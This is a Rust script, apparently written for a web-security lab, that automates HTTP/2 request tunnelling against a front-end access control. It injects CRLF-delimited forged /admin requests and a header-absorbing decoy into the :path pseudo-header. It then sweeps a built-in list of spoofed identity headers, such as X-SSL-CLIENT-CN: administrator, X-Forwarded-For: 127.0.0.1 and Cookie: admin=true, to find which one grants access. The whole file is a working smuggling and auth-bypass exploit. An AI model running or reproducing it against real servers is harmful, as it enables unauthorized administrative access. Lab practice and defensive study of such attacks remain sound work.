#!/usr/bin/env rust-script
//! name: h2acl_sweep
//! description: Batch tunnelled-/admin prober for the H2 request-tunnelling ACL lab - for each candidate inner-request header set it builds a decoy-absorbed /admin tunnel (:path carries the forged /admin request plus a trailing decoy that soaks up the front-end's appended Host/X-SSL-* headers), sends it over raw HTTP/2, and reports the status/body-len so the ACL predicate can be located by sweeping instead of one h2_req call per guess.
//! version: 1.0.0
//! args: <url> [--host HOST] [--target /admin] [--method GET] [--cl N] [--line 'NAME: VALUE']... [--file FILE] [--builtin] [--read-ms N] [--selftest]
//! keywords: h2, http2, smuggling, tunnelling, request-tunnelling, access-control, sweep, lab
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

fn unescape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.next() {
                Some('r') => out.push('\r'),
                Some('n') => out.push('\n'),
                Some('t') => out.push('\t'),
                Some('0') => out.push('\0'),
                Some('\\') => out.push('\\'),
                Some(other) => { out.push('\\'); out.push(other); }
                None => out.push('\\'),
            }
        } else { out.push(c); }
    }
    out
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

/// Build the injected :path value for a candidate: the forged target request
/// (target + headers + blank) followed by a decoy request whose header block is
/// left open so the front-end's appended Host/X-SSL-* headers attach to it.
fn build_path(target: &str, method: &str, host: &str, lines: &[String], cl: u64) -> String {
    let mut p = String::new();
    p.push_str(target);
    p.push_str(" HTTP/1.1\r\n");
    p.push_str(&format!("Host: {host}\r\n"));
    for l in lines {
        p.push_str(l);
        p.push_str("\r\n");
    }
    if cl > 0 {
        p.push_str(&format!("Content-Length: {cl}\r\n"));
    }
    p.push_str("\r\n");
    // decoy: no trailing blank, so the front-end's appended headers land in it
    p.push_str(&format!("{method} / HTTP/1.1\r\n"));
    p.push_str(&format!("Host: {host}\r\n"));
    p.push_str("X-Decoy: 1");
    p
}

async fn probe(host: &str, port: u16, path: &str, method: &str, read_ms: u64) -> Result<(Option<String>, usize, String), String> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    let connector = TlsConnector::from(Arc::new(config));
    let server_name = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(server_name, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n").await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;

    let headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), method.as_bytes().to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), path.as_bytes().to_vec()),
    ];
    let block = hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x5, 1, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;

    let idle = Duration::from_millis(read_ms.max(300));
    let mut raw: Vec<u8> = Vec::new();
    let mut status: Option<String> = None;
    let mut body: Vec<u8> = Vec::new();
    let mut decoder = hpack::Decoder::new();
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) | Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 {
            if tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() { break; }
        }
        raw.extend_from_slice(&payload);
        match ftype {
            4 => { if flags & 0x1 == 0 { let _ = tls.write_all(&frame(4, 1, 0, &[])).await; let _ = tls.flush().await; } }
            6 => { if flags & 0x1 == 0 { let _ = tls.write_all(&frame(6, 1, 0, &payload)).await; let _ = tls.flush().await; } }
            1 | 9 if sid == 1 => {
                if let Ok(hs) = decoder.decode(&payload) {
                    for (n, v) in hs {
                        if n == b":status" { status = Some(String::from_utf8_lossy(&v).to_string()); }
                    }
                }
            }
            0 if sid == 1 => body.extend_from_slice(&payload),
            _ => {}
        }
    }
    let snippet: String = String::from_utf8_lossy(&body).chars().take(160).collect();
    Ok((status, body.len(), snippet))
}

fn builtin() -> Vec<(String, Vec<String>)> {
    let mut v: Vec<(String, Vec<String>)> = Vec::new();
    let mut add = |label: &str, lines: &[&str]| {
        v.push((label.to_string(), lines.iter().map(|s| s.to_string()).collect()));
    };
    add("none", &[]);
    add("X-SSL-VERIFIED:1", &["X-SSL-VERIFIED: 1"]);
    add("X-SSL-VERIFIED:true", &["X-SSL-VERIFIED: true"]);
    add("X-SSL-VERIFIED:yes", &["X-SSL-VERIFIED: yes"]);
    add("X-SSL-VERIFIED:0", &["X-SSL-VERIFIED: 0"]);
    add("X-SSL-CLIENT-CN:administrator", &["X-SSL-CLIENT-CN: administrator"]);
    add("X-SSL-CLIENT-CN:admin", &["X-SSL-CLIENT-CN: admin"]);
    add("X-SSL-CLIENT-CN:root", &["X-SSL-CLIENT-CN: root"]);
    add("X-SSL-CLIENT-CN:CN=administrator", &["X-SSL-CLIENT-CN: CN=administrator"]);
    add("X-SSL-CLIENT-CN:/CN=administrator", &["X-SSL-CLIENT-CN: /CN=administrator"]);
    add("verified+cn", &["X-SSL-VERIFIED: 1", "X-SSL-CLIENT-CN: administrator"]);
    add("X-SSL-CLIENT-S-DN:CN=administrator", &["X-SSL-CLIENT-S-DN: CN=administrator"]);
    add("X-SSL-CLIENT-S-DN:/CN=administrator", &["X-SSL-CLIENT-S-DN: /CN=administrator"]);
    add("X-SSL-CLIENT-I-DN:CN=administrator", &["X-SSL-CLIENT-I-DN: CN=administrator"]);
    add("X-SSL-CLIENT-DN:CN=administrator", &["X-SSL-CLIENT-DN: CN=administrator"]);
    add("X-SSL-CLIENT-CERT:administrator", &["X-SSL-CLIENT-CERT: administrator"]);
    add("X-SSL-CLIENT-VERIFY:SUCCESS", &["X-SSL-CLIENT-VERIFY: SUCCESS"]);
    add("X-SSL-VERIFIED+CN+S-DN", &["X-SSL-VERIFIED: 1", "X-SSL-CLIENT-CN: administrator", "X-SSL-CLIENT-S-DN: CN=administrator"]);
    add("X-Forwarded-For:127.0.0.1", &["X-Forwarded-For: 127.0.0.1"]);
    add("X-Real-IP:127.0.0.1", &["X-Real-IP: 127.0.0.1"]);
    add("X-Original-URL:/admin", &["X-Original-URL: /admin"]);
    add("X-Rewrite-URL:/admin", &["X-Rewrite-URL: /admin"]);
    add("X-User:administrator", &["X-User: administrator"]);
    add("X-Remote-User:administrator", &["X-Remote-User: administrator"]);
    add("X-Forwarded-User:administrator", &["X-Forwarded-User: administrator"]);
    add("Cookie:admin=true", &["Cookie: admin=true"]);
    add("Cookie:role=admin", &["Cookie: role=admin"]);
    add("X-Forwarded-Host:localhost", &["X-Forwarded-Host: localhost"]);
    add("lower x-ssl-verified:1", &["x-ssl-verified: 1"]);
    add("lower verified+cn", &["x-ssl-verified: 1", "x-ssl-client-cn: administrator"]);
    v
}

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let p = build_path("/admin", "GET", "h", &["X-SSL-VERIFIED: 1".to_string()], 116);
        let ok = p.starts_with("/admin HTTP/1.1\r\nHost: h\r\nX-SSL-VERIFIED: 1\r\nContent-Length: 116\r\n\r\nGET / HTTP/1.1");
        pi_rust_lib::report::success("h2acl_sweep", json!({"selftest": ok, "sample": p}),
            "selftest green -> the path builder emits the forged target then an open decoy").unwrap_or(());
        return;
    }
    let mut url = String::new();
    let mut host_override: Option<String> = None;
    let mut target = "/admin".to_string();
    let mut method = "GET".to_string();
    let mut cl = 116u64;
    let mut lines: Vec<String> = Vec::new();
    let mut file: Option<String> = None;
    let mut run_builtin = false;
    let mut read_ms = 2500u64;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--host" => { i += 1; if let Some(v) = args.get(i) { host_override = Some(unescape(v)); } }
            "--target" => { i += 1; if let Some(v) = args.get(i) { target = unescape(v); } }
            "--method" => { i += 1; if let Some(v) = args.get(i) { method = unescape(v); } }
            "--cl" => { i += 1; if let Some(v) = args.get(i) { cl = v.parse().unwrap_or(cl); } }
            "--line" => { i += 1; if let Some(v) = args.get(i) { lines.push(unescape(v)); } }
            "--file" => { i += 1; if let Some(v) = args.get(i) { file = Some(v.clone()); } }
            "--builtin" => run_builtin = true,
            "--read-ms" => { i += 1; if let Some(v) = args.get(i) { read_ms = v.parse().unwrap_or(read_ms); } }
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if url.is_empty() {
        pi_rust_lib::report::failure("h2acl_sweep", "missing url",
            "usage: h2acl_sweep <url> --builtin | --line 'N: V'... | --file FILE");
        std::process::exit(2);
    }
    let parsed = Url::parse(&url).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = host_override.clone().unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);

    let mut candidates: Vec<(String, Vec<String>)> = Vec::new();
    if run_builtin { candidates.extend(builtin()); }
    if !lines.is_empty() { candidates.push(("cli".to_string(), lines.clone())); }
    if let Some(f) = &file {
        if let Ok(text) = std::fs::read_to_string(f) {
            for (n, raw) in text.lines().enumerate() {
                let t = raw.trim_end();
                if t.is_empty() || t.starts_with('#') { continue; }
                candidates.push((format!("file:{}", n + 1), vec![t.to_string()]));
            }
        }
    }
    if candidates.is_empty() {
        pi_rust_lib::report::failure("h2acl_sweep", "no candidates", "pass --builtin or --line / --file");
        std::process::exit(2);
    }

    let mut rows: Vec<Value> = Vec::new();
    let mut hits: Vec<String> = Vec::new();
    for (label, ls) in &candidates {
        let path = build_path(&target, "GET", &host, ls, cl);
        let r = probe(&host, port, &path, &method, read_ms).await;
        match r {
            Ok((status, blen, snippet)) => {
                let st = status.clone().unwrap_or_else(|| "none".to_string());
                if st.starts_with('2') { hits.push(format!("{label} -> {st}")); }
                rows.push(json!({"label": label, "status": st, "body_len": blen, "snippet": snippet}));
            }
            Err(e) => rows.push(json!({"label": label, "error": e})),
        }
    }
    pi_rust_lib::report::success("h2acl_sweep",
        json!({"target": target, "host": host, "candidates": candidates.len(), "hits": hits, "rows": rows}),
        "a 2xx row names the ACL predicate; all-4xx means the header space is exhausted").unwrap_or(());
}
